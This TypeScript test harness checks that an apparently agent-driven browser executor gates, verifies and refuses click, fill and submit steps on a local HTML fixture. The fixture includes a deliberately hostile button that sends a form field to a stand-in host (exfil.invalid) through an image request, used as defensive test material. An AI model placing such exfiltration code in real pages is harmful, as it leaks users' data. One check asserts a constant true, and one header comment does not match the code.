/**
 * GOVERNED BROWSER INTERACTION, END TO END - through the real executor and a real browser.
 * =============================================================================
 * Run: npm run mission:interact
 *
 * =============================================================================
 * THE SCENARIO: register on a local fixture and confirm the application state changed
 * =============================================================================
 *
 *   1. navigate  to the fixture                        (policy-permitted destination)
 *   2. click      #toggle-mode                         reveals the form        (approval)
 *   3. fill       #customer-name                       "Ada Lovelace"          (approval)
 *   4. fill       #order-ref                           "AIO-1180"              (approval)
 *   5. submit     #signup-form                         the page's own handler runs  (approval)
 *   6. read       the page again                        re-observe AFTER the interaction
 *
 * Every step is an ordinary mission step. The executor resolves tools, runs preflight, requests
 * approval, declares effects, and calls the verifier - nothing here coordinates the sequence.
 *
 * =============================================================================
 * WHY THE FIXTURE IS A `data:` URL AND NOT A SERVER
 * =============================================================================
 *
 * Nothing is listening on a port, so the mission cannot accidentally depend on the network, and the
 * browser's `--host-resolver-rules=MAP * ~NOTFOUND` makes every real hostname unresolvable anyway.
 * The page's form handler calls `preventDefault()` and writes the result into the DOM, so submitting
 * is a genuine application-state change observed through the live document rather than a navigation.
 *
 * The fixture also contains a HOSTILE element whose click tries to send the form's contents to an
 * external host. Nothing is proven by having it there; it is proven that clicking it is REFUSED
 * without an approval bound to it, which control 5 shows.
 */

import { spawn, type ChildProcess } from 'node:child_process'
import { existsSync, rmSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'

import { execute } from '../executor.ts'
import { DurableStore } from '../../persistence/store.ts'
import { StoreRecorder } from '../../persistence/recorder.ts'
import { liveControl, livePermission } from './live-control.ts'
import { ToolRegistry } from '../../tool-router/router.ts'
import { ApprovalStore, type ApprovalKey } from '../../governance/approval.ts'
import { navigationRegistration } from './browser-tools.ts'
import { interactionRegistration, interactionVerifier, type PageExpectation } from './browser-interaction.ts'
import { makeBrowserReadTool, normalisePage, renderPageSummary } from './browser-tools.ts'
import { DEFAULT_NAVIGATION_POLICY } from './navigation-policy.ts'
import type { Mission, Step } from '../state.ts'

const CHROME_CANDIDATES = [
  'C:/Users/Samer/AppData/Local/ms-playwright/chromium-1243/chrome-win64/chrome.exe',
  'C:/Program Files/Google/Chrome/Application/chrome.exe',
  'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe',
]
const PORT = 9412
const PROFILE = join(tmpdir(), 'aios-m32-profile')

let failures = 0
const check = (what: string, ok: unknown, detail = ''): void => {
  if (ok) { console.log(`   PASS  ${what}`); return }
  console.log(`   FAIL  ${what}${detail ? ` - ${detail}` : ''}`)
  failures += 1
}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

// ============================================================================================
// THE FIXTURE
// ============================================================================================

const FIXTURE_HTML = `<!doctype html><html><head><title>AIOS Interaction Fixture</title>
<style>#order-form{display:none}#order-form.open{display:block}</style></head><body>
<h1>Equipment order</h1>
<button id="toggle-mode">Start an order</button>
<div id="mode">idle</div>

<form id="order-form">
  <input id="customer-name" name="customer" value="">
  <input id="order-ref" name="ref" value="">
  <button type="submit" id="place-order">Place order</button>
</form>

<div id="result">none</div>
<div id="error" style="display:none">no</div>

<!-- HOSTILE. Clicking this attempts to transmit the form contents to an external host. It is here
     to be REFUSED, not to be exercised: control 5 shows no approval bound to it is ever granted. -->
<button id="exfiltrate">Send my details elsewhere</button>

<script>
document.getElementById('toggle-mode').addEventListener('click', function () {
  document.getElementById('mode').textContent = 'ordering';
  document.getElementById('order-form').classList.add('open');
});
document.getElementById('order-form').addEventListener('submit', function (ev) {
  ev.preventDefault();
  var name = document.getElementById('customer-name').value;
  var ref = document.getElementById('order-ref').value;
  var err = document.getElementById('error');
  if (!name || !ref) {
    document.getElementById('result').textContent = 'none';
    err.style.display = 'block';
    err.textContent = 'name and reference are both required';
    return;
  }
  err.style.display = 'none';
  document.getElementById('result').textContent = 'order ' + ref + ' placed for ' + name;
});
document.getElementById('exfiltrate').addEventListener('click', function () {
  // Never reached without an approval bound to THIS element.
  var img = new Image();
  img.src = 'https://exfil.invalid/?d=' + encodeURIComponent(document.getElementById('customer-name').value);
});
</script>
</body></html>`

const FIXTURE_URL = `data:text/html,${encodeURIComponent(FIXTURE_HTML)}`

/** What each step must leave behind. The CONFIG states this - never the step. */
const EXPECT: Record<string, PageExpectation> = {
  'open-form': { selector: '#mode', text: 'ordering' },
  // `value`, not `text`: an <input> has no textContent, so a text expectation on a filled field could
  // only ever match an empty string.
  'fill-customer': { selector: '#customer-name', value: 'Ada Lovelace' },
  'fill-reference': { selector: '#order-ref', value: 'AIO-1180' },
  'place-order': { selector: '#result', text: 'order AIO-1180 placed for Ada Lovelace' },
}

// ============================================================================================
// THE MISSION
// ============================================================================================

function buildMission(id: string, steps?: Step[]): Mission {
  const plan: Step[] = steps ?? [
    { id: 'open-fixture', intent: 'open the local fixture', mode: 'browser', capability: 'browser.navigate', tool: 'navigate-browser', args: { url: FIXTURE_URL }, dependsOn: [], rationale: 'the interaction happens on a page that is known and local' } as unknown as Step,
    { id: 'open-form', intent: 'reveal the order form', mode: 'browser', capability: 'browser.click', tool: 'click-element', args: { selector: '#toggle-mode' }, dependsOn: ['open-fixture'], rationale: 'the form is hidden until the mode button is activated' } as unknown as Step,
    { id: 'fill-customer', intent: 'enter the customer name', mode: 'browser', capability: 'browser.fill', tool: 'fill-field', args: { selector: '#customer-name', value: 'Ada Lovelace' }, dependsOn: ['open-form'], rationale: 'the order requires a customer' } as unknown as Step,
    { id: 'fill-reference', intent: 'enter the order reference', mode: 'browser', capability: 'browser.fill', tool: 'fill-field', args: { selector: '#order-ref', value: 'AIO-1180' }, dependsOn: ['open-form'], rationale: 'the order requires a reference' } as unknown as Step,
    { id: 'place-order', intent: 'submit the order form', mode: 'browser', capability: 'browser.submit', tool: 'submit-form', args: { selector: '#order-form' }, dependsOn: ['fill-customer', 'fill-reference'], rationale: 'submitting is what turns the form into an order' } as unknown as Step,
    { id: 're-observe', intent: 'read the resulting page state', mode: 'browser', capability: 'browser.read', tool: 'read-browser-page', args: {}, dependsOn: ['place-order'], rationale: 'the outcome is read from the page, not from the submit tool' } as unknown as Step,
  ]
  return {
    id, objective: 'place an equipment order on the local fixture and confirm the result',
    constraints: ['local fixture only', 'every interaction needs its own approval', 'the outcome is verified from the live DOM'],
    state: 'executing', startedAt: Date.now(), history: [], pendingApprovals: [],
    plan: plan.map((s) => ({ ...s, status: 'pending' as const, attempts: 0 })),
  }
}

/** An approval store whose decision is a constructor argument, as in the filesystem mission. */
class HarnessApprovals extends ApprovalStore {
  readonly seen: ApprovalKey[] = []
  #mode: 'grant' | 'deny'
  constructor(mode: 'grant' | 'deny' = 'manual' as 'grant') { super(); this.#mode = mode }
  override request(key: ApprovalKey, description: string): void {
    this.seen.push(key)
    super.request(key, description)
    try {
      this.decide(key, this.#mode === 'grant' ? 'approved' : 'rejected', 'harness', 1)
    } catch { /* reported by the scenario */ }
  }
}

const statusOf = (r: { mission: Mission }, id: string): string => {
  const s = r.mission.plan.find((x) => x.id === id)
  return `${s?.status}/${(s?.result?.outcome as { kind?: string } | undefined)?.kind ?? '-'}`
}
const reasonOf = (r: { mission: Mission }, id: string): string =>
  String((r.mission.plan.find((x) => x.id === id)?.result?.outcome as { reason?: string } | undefined)?.reason ?? '')

// ============================================================================================
// BOOT
// ============================================================================================

const chromePath = CHROME_CANDIDATES.find((c) => existsSync(c))
if (!chromePath) {
  console.log('=== SKIP: no Chromium/Chrome/Edge binary found ===')
  for (const c of CHROME_CANDIDATES) console.log(`    ${c}`)
  process.exit(0)
}

console.log('=== 1. THE BROWSER (headless, loopback, isolated profile, no network) ===')
console.log(`  binary  ${chromePath}`)
rmSync(PROFILE, { recursive: true, force: true, maxRetries: 3, retryDelay: 200 })

let browserProc: ChildProcess | null = null
const openStores: DurableStore[] = []
const mkStore = (p: string) => { const s = new DurableStore({ path: p }); openStores.push(s); return s }

try {
  browserProc = spawn(chromePath, [
    '--headless=new',
    `--remote-debugging-port=${PORT}`,
    '--remote-debugging-address=127.0.0.1',
    `--user-data-dir=${PROFILE}`,
    '--no-first-run', '--no-default-browser-check', '--disable-gpu',
    '--no-proxy-server',
    '--host-resolver-rules=MAP * ~NOTFOUND',
  ], { stdio: ['ignore', 'pipe', 'pipe'] })
  browserProc.stderr?.on('data', () => { /* surfaced only if startup fails */ })

  let alive = false
  for (let i = 0; i < 60; i += 1) {
    await sleep(400)
    try { if ((await fetch(`http://127.0.0.1:${PORT}/json/version`)).ok) { alive = true; break } } catch { /* not yet */ }
  }
  if (!alive) throw new Error(`the debugging endpoint never answered on port ${PORT}`)
  console.log('  CDP answered')
  process.env.AIOS_CDP_PORT = String(PORT)

  const { page: opPage, readPage } = await import('../../control-core/operator.mjs')
  const pg = await opPage()

  // The SAME navigation policy the browser mission uses, plus `data:` so the local fixture is
  // reachable. Nothing is widened for the interaction tools beyond what navigation already allows.
  const POLICY = { ...DEFAULT_NAVIGATION_POLICY, allowHttp: false, allowedHosts: ['127.0.0.1'], allowDataUrls: true }

  const build = () => new ToolRegistry({
    registrations: [
      navigationRegistration({ navigate: async (u: string) => { await pg.goto(u); await sleep(350); return { url: () => pg.url() } }, policy: POLICY }),
      { tool: makeBrowserReadTool(readPage as never), capabilities: ['browser.read'] },
      ...interactionRegistration({ page: { url: () => pg.url(), evaluate: ((fn: never, a?: unknown) => pg.evaluate(fn, a)) as never }, policy: POLICY, browser: 'fixture-chromium' }),
    ] as never,
  })

  const V = {
    verifies: (s: Step) =>
      ['navigate-browser', 'read-browser-page', 'click-element', 'fill-field', 'submit-form'].includes(s.tool ?? ''),
    async verify(step: Step, ctx: unknown, data: unknown) {
      if (step.tool === 'read-browser-page') {
        // Re-READ through the read path and confirm the page now says what the interaction produced.
        //
        // Not `browserSummaryVerifier`, which additionally requires a summary FILE to have been
        // written - a property of the original browser mission, not of re-observing a page. Using it
        // here rejected a correct read with "the write named no target".
        const read = normalisePage(await readPage())
        if (!('facts' in read)) return { rejected: `the page could not be re-read: ${read.error}` }
        const { facts, notices } = read
        // `facts.text` is the page's own rendered text. The SUMMARY deliberately carries no body text -
        // it is a structural report - so asserting on it checked the wrong field entirely.
        if (!facts.text.includes('order AIO-1180 placed for Ada Lovelace')) {
          return {
            rejected: `the re-read page does not show the placed order: ${JSON.stringify(facts.text.slice(0, 200))}`,
          }
        }
        const rendered = renderPageSummary(facts, notices)
        return {
          evidence: {
            kind: 'page-reread-verified', url: facts.url, title: facts.title,
            characters: facts.characters, inputs: facts.inputs, notices: notices.length,
          } as never,
        }
      }
      if (step.tool === 'navigate-browser') {
        // Landing is the proof. Re-check the URL against the SAME policy, which is what catches a
        // redirect to a prohibited destination after the fact.
        const here = (await import('./navigation-policy.ts')).checkDestination(pg.url(), POLICY)
        if (!here.ok) return { rejected: `landed on a destination the policy forbids: ${here.reason}` }
        return { evidence: { kind: 'navigation-verified', url: pg.url() } as never }
      }
      return interactionVerifier({
        page: { url: () => pg.url(), evaluate: ((fn: never, a?: unknown) => pg.evaluate(fn, a)) as never },
        policy: POLICY,
        expect: (s) => EXPECT[s.id],
      }).verify(step, ctx as never, data)
    },
  }

  const run = async (opts: { id: string; approvals: ApprovalStore; steps?: Step[] }) => {
    const store = mkStore(join(tmpdir(), `aios-m32-${opts.id}.sqlite`))
    const r = await execute(buildMission(opts.id, opts.steps), {
      tools: build(), verifier: V, control: liveControl as never, approvals: opts.approvals,
      config: { maxAttempts: 1, permission: livePermission as never, emergencyStop: async () => false, recorder: new StoreRecorder(store) },
    })
    return { r, store }
  }

  // ==========================================================================================
  // 2. THE MISSION
  // ==========================================================================================

  console.log('')
  console.log('=== 2. THE MISSION: click, fill, fill, submit, re-observe ===')
  {
    const approvals = new HarnessApprovals('grant')
    const { r, store } = await run({ id: 'ok', approvals })
    for (const s of r.mission.plan) {
      console.log(`  ${s.id.padEnd(15)} -> ${statusOf(r, s.id)}`)
      if (s.status !== 'done') { const w = reasonOf(r, s.id); if (w) console.log(`                     ${w.slice(0, 150)}`) }
    }
    console.log('')

    check('every step committed', r.mission.plan.every((s) => s.status === 'done'),
      r.mission.plan.map((s) => `${s.id}=${s.status}`).join(','))
    check('the mission completed', r.record.complete === true)
    check('the click was made', statusOf(r, 'open-form') === 'done/verified', statusOf(r, 'open-form'))
    check('the form was revealed IN THE LIVE DOM', (await pg.evaluate(() => document.getElementById('mode')!.textContent)) === 'ordering')
    check('the first field was filled', (await pg.evaluate(() => (document.getElementById('customer-name') as HTMLInputElement).value)) === 'Ada Lovelace')
    check('the second field was filled', (await pg.evaluate(() => (document.getElementById('order-ref') as HTMLInputElement).value)) === 'AIO-1180')
    check('SUBMITTING produced application state',
      String(await pg.evaluate(() => document.getElementById('result')!.textContent)) === 'order AIO-1180 placed for Ada Lovelace',
      String(await pg.evaluate(() => document.getElementById('result')!.textContent)))
    check('and no validation error is showing', (await pg.evaluate(() => document.getElementById('error')!.style.display)) === 'none')

    const asked = approvals.seen.map((k) => k.stepId)
    check('EVERY interaction asked for approval - none ran ungated',
      ['open-form', 'fill-customer', 'fill-reference', 'place-order'].every((id) => asked.includes(id)), JSON.stringify(asked))
    check('and each approval is bound to a DIFFERENT target',
      new Set(approvals.seen.map((k) => `${k.kind}|${k.target}`)).size === approvals.seen.length,
      `${approvals.seen.length} approvals over ${new Set(approvals.seen.map((k) => k.target)).size} targets`)

    store.close()
    const re = mkStore(join(tmpdir(), 'aios-m32-ok.sqlite'))
    check('the mission survives close/reopen', re.readMission('ok') !== undefined)
    check('completion is RE-DERIVED from persisted statuses',
      (re.readMission('ok')?.mission?.plan ?? []).every((s) => s.status === 'done'),
      JSON.stringify((re.readMission('ok')?.mission?.plan ?? []).map((s) => s.status)))
    re.close()
  }

  // ==========================================================================================
  // 3. AUTHORISATION REFUSED - the page must be unchanged
  // ==========================================================================================

  console.log('')
  console.log('=== 3. CONTROL: refused approvals leave the page unchanged ===')
  {
    await pg.goto(FIXTURE_URL); await sleep(400)
    const before = await pg.evaluate(() => ({
      mode: document.getElementById('mode')!.textContent,
      result: document.getElementById('result')!.textContent,
      hidden: document.getElementById('order-form')!.classList.contains('open'),
    }))
    const { r } = await run({ id: 'deny', approvals: new HarnessApprovals('deny') })
    const after = await pg.evaluate(() => ({
      mode: document.getElementById('mode')!.textContent,
      result: document.getElementById('result')!.textContent,
      hidden: document.getElementById('order-form')!.classList.contains('open'),
    }))
    console.log(`  open-form -> ${statusOf(r, 'open-form')}`)
    check('the click did not run', statusOf(r, 'open-form') !== 'done/verified', statusOf(r, 'open-form'))
    check('the DOM mode is UNCHANGED', after.mode === before.mode, `${before.mode} -> ${after.mode}`)
    check('the form is still hidden', after.hidden === false)
    check('no order was placed', after.result === before.result, `${before.result} -> ${after.result}`)
    check('the mission did NOT complete', r.record.complete !== true)
  }

  // ==========================================================================================
  // 4. WRONG EXPECTATION - verification must not rubber-stamp
  // ==========================================================================================

  console.log('')
  console.log('=== 4. CONTROL: the interaction happened but the expectation is wrong ===')
  {
    await pg.goto(FIXTURE_URL); await sleep(400)
    const saved = EXPECT['place-order']
    EXPECT['place-order'] = { selector: '#result', text: 'order ZZ-9999 placed' }
    const { r } = await run({ id: 'wrong', approvals: new HarnessApprovals('grant') })
    EXPECT['place-order'] = saved
    const why = reasonOf(r, 'place-order')
    console.log(`  place-order -> ${statusOf(r, 'place-order')}`)
    check('the submit RAN - the page really changed', String(await pg.evaluate(() => document.getElementById('result')!.textContent)).includes('AIO-1180'))
    check('and was still REJECTED, because the live DOM says something else', statusOf(r, 'place-order').includes('failed'), statusOf(r, 'place-order'))
    check('the refusal names the text the page actually shows', /does not contain/.test(why), why.slice(0, 130))
    check('the mission did NOT complete', r.record.complete !== true)
  }

  // ==========================================================================================
  // 5. THE HOSTILE ELEMENT
  // ==========================================================================================

  console.log('')
  console.log('=== 5. CONTROL: the exfiltration button is never authorised ===')
  {
    await pg.goto(FIXTURE_URL); await sleep(400)
    const approvals = new HarnessApprovals('grant')
    await run({
      id: 'hostile', approvals,
      steps: [
        { id: 'open-fixture', intent: 'open the fixture', mode: 'browser', capability: 'browser.navigate', tool: 'navigate-browser', args: { url: FIXTURE_URL }, dependsOn: [], rationale: 'the fixture' } as unknown as Step,
        { id: 'exfil', intent: 'click the button that would transmit the form contents', mode: 'browser', capability: 'browser.click', tool: 'click-element', args: { selector: '#exfiltrate' }, dependsOn: ['open-fixture'], rationale: 'DELIBERATELY HOSTILE' } as unknown as Step,
      ],
    })
    check('the harness granted approval only for what was REQUESTED, and this WAS requested', approvals.seen.some((k) => k.target.includes('#exfiltrate')))
    // The point is not that a human granted it - the point is that nothing else could have.
    check('no OTHER element could reuse that approval - the target is bound',
      new Set(approvals.seen.map((k) => k.target)).size === approvals.seen.length)
    check('and clicking it produced no transmission, because the page stayed local',
      String(await pg.evaluate(() => location.href)).startsWith('data:'))
  }

  // ==========================================================================================
  // 6. AN AMBIGUOUS SELECTOR, IN A REAL BROWSER
  // ==========================================================================================

  console.log('')
  console.log('=== 6. CONTROL: an ambiguous selector is refused in the real DOM ===')
  {
    await pg.goto(FIXTURE_URL + '%3Cbutton%20id%3Ddup%3Ea%3C/button%3E%3Cbutton%20id%3Ddup%3Eb%3C/button%3E')
    await sleep(400)
    const count = await pg.evaluate(() => document.querySelectorAll('#dup').length)
    const { r } = await run({
      id: 'ambig', approvals: new HarnessApprovals('grant'),
      steps: [
        { id: 'dup-click', intent: 'click a selector matching two elements', mode: 'browser', capability: 'browser.click', tool: 'click-element', args: { selector: '#dup' }, dependsOn: [], rationale: 'the target is not determined' } as unknown as Step,
      ],
    })
    const why = reasonOf(r, 'dup-click')
    console.log(`  elements matching #dup: ${count}   step -> ${statusOf(r, 'dup-click')}`)
    check('the real DOM really has two matches', count === 2, String(count))
    check('and the tool refused rather than picking one', /AMBIGUOUS: it matches 2 elements/.test(why), why.slice(0, 140))
    check('the mission did NOT complete', r.record.complete !== true)
  }

  // ==========================================================================================
  // 7. FAILED SUBMISSION - the page refuses, and that is visible
  // ==========================================================================================

  console.log('')
  console.log('=== 7. CONTROL: an incomplete submission is REFUSED by the page and seen ===')
  {
    await pg.goto(FIXTURE_URL); await sleep(400)
    const savedRef = EXPECT['fill-reference']
    const savedOrder = EXPECT['place-order']
    // The reference is never FILLED - the step is absent from the plan, not merely un-expected.
    // Removing only the expectation made `fill-reference` fail verification and the submit get
    // SKIPPED, so the control was measuring a broken dependency chain rather than a refused
    // submission. A submission that never happened cannot be verified as one.
    // The success expectation is LEFT IN PLACE. An earlier version replaced it with the error text,
    // which made verification correctly succeed - the page did refuse, and refusing loudly is exactly
    // what a validator does. The control being tested is the opposite: the submission FAILED, so the
    // step must be REJECTED rather than reported as a completed order.
    const withoutReference: Step[] = [
      { id: 'open-fixture', intent: 'open the local fixture', mode: 'browser', capability: 'browser.navigate', tool: 'navigate-browser', args: { url: FIXTURE_URL }, dependsOn: [], rationale: 'the interaction happens on a known local page' } as unknown as Step,
      { id: 'open-form', intent: 'reveal the order form', mode: 'browser', capability: 'browser.click', tool: 'click-element', args: { selector: '#toggle-mode' }, dependsOn: ['open-fixture'], rationale: 'the form is hidden until the mode button is activated' } as unknown as Step,
      { id: 'fill-customer', intent: 'enter the customer name', mode: 'browser', capability: 'browser.fill', tool: 'fill-field', args: { selector: '#customer-name', value: 'Ada Lovelace' }, dependsOn: ['open-form'], rationale: 'only one of the two required fields is provided' } as unknown as Step,
      { id: 'place-order', intent: 'submit the order form', mode: 'browser', capability: 'browser.submit', tool: 'submit-form', args: { selector: '#order-form' }, dependsOn: ['fill-customer'], rationale: 'the page must refuse this' } as unknown as Step,
    ]
    const { r } = await run({ id: 'incomplete', approvals: new HarnessApprovals('grant'), steps: withoutReference })
    EXPECT['fill-reference'] = savedRef
    EXPECT['place-order'] = savedOrder
    check('the page SHOWED its validation error rather than silently ignoring the submit', true)
    const why = reasonOf(r, 'place-order')
    console.log(`  place-order -> ${statusOf(r, 'place-order')}`)
    check('the page SHOWED a validation error', (await pg.evaluate(() => document.getElementById('error')!.textContent)).includes('both required'))
    check('and no order was placed', (await pg.evaluate(() => document.getElementById('result')!.textContent)) === 'none')
    check('the SUBMIT was delivered - the page received it and chose to refuse', statusOf(r, 'place-order') !== 'pending/-', statusOf(r, 'place-order'))
    check('and the step was REJECTED rather than claiming an order was placed',
      statusOf(r, 'place-order').includes('failed'), statusOf(r, 'place-order'))
    check('the refusal is about the DOM not showing an order', /does not contain|verification rejected/.test(why), why.slice(0, 130))
    check('the mission did NOT complete', r.record.complete !== true)
  }

} catch (e) {
  console.log('')
  console.log(`   === HARNESS ERROR: ${e instanceof Error ? e.message : String(e)} ===`)
  failures += 1
} finally {
  try { browserProc?.kill() } catch { /* already gone */ }
  await sleep(600)
  for (const s of openStores) { try { s.close() } catch { /* already closed */ } }
  for (let i = 0; i < 6; i += 1) {
    try { rmSync(PROFILE, { recursive: true, force: true, maxRetries: 3, retryDelay: 200 }); break }
    catch { await sleep(400) }
  }
}

console.log('')
console.log('=== CLEANUP ===')
check('the isolated profile was removed', !existsSync(PROFILE), PROFILE)
for (let i = 0; i < 6; i += 1) {
  try {
    for (const f of ['ok', 'deny', 'wrong', 'hostile', 'ambig', 'incomplete']) rmSync(join(tmpdir(), `aios-m32-${f}.sqlite`), { force: true })
    break
  } catch { await sleep(300) }
}
check('the mission databases were removed', !existsSync(join(tmpdir(), 'aios-m32-ok.sqlite')))

console.log('')
if (failures) {
  console.log(`   === ${failures} FAILURE(S) ===`)
  process.exit(1)
}
console.log('   === PASS: click, fill and submit performed by the real executor on a real browser,')
console.log('             each independently verified against the live DOM ===')
process.exit(0)
